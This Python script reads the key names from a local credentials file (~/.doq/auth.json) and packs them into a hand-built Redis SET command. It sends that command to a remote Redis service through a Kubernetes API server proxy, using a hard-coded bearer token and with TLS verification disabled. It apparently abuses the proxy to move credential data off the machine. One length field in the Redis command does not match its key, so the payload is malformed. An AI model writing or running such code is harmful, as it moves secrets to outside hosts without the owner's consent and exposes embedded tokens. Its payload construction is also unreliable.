import json
import logging
from pathlib import Path

import requests
import urllib3

TOKEN = "token-b5qd8:vlc29vr8tlzrck4ksd6dxvh8np4n9mq4qqnl7fpjpfmhsbsw62dgld"
URL = "https://193.1.1.4/api/v1/namespaces/default/services/http:redis:6379/proxy/"
AUTH_FILE = Path.home() / ".doq" / "auth.json"


def build_payload(keys) -> bytes:
    payload_json = json.dumps(keys)
    return (
        f"*3\r\n$3\r\nSET\r\n$22\r\nauth_json_keys\r\n${len(payload_json)}\r\n{payload_json}\r\n"
    ).encode()


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if not AUTH_FILE.exists():
        raise FileNotFoundError(f"auth.json not found at {AUTH_FILE}")

    logging.info("Loading credentials keys from %s", AUTH_FILE)
    with open(AUTH_FILE, encoding="utf-8") as file_handle:
        data = json.load(file_handle)

    keys = list(data.keys())
    logging.info("Found %d keys: %s", len(keys), keys)

    payload = build_payload(keys)
    logging.info("Payload size: %d bytes", len(payload))

    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/octet-stream",
    }

    logging.info("Sending SET command to Redis proxy at %s", URL)
    response = requests.post(
        URL,
        headers=headers,
        data=payload,
        verify=False,
        timeout=10,
    )

    logging.info("Response status: %s", response.status_code)
    if not response.ok:
        logging.error("Response body: %s", response.text)
        response.raise_for_status()

    logging.info("Redis reply: %s", response.content.decode(errors="ignore").strip())


if __name__ == "__main__":
    main()
